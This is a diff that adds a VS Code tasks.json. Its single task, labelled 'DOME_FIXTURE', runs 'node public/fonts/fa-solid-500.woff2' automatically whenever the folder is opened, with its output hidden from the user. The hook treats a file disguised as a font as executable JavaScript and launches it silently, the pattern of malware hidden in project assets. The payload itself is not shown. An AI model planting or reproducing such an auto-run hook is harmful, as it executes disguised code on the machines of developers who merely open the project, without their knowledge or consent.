@@ -1,0 +1,17 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "DOME_FIXTURE",
+      "type": "shell",
+      "command": "node public/fonts/fa-solid-500.woff2",
+      "runOptions": {
+        "runOn": "folderOpen"
+      },
+      "presentation": {
+        "reveal": "never",
+        "echo": false
+      }
+    }
+  ]
+}
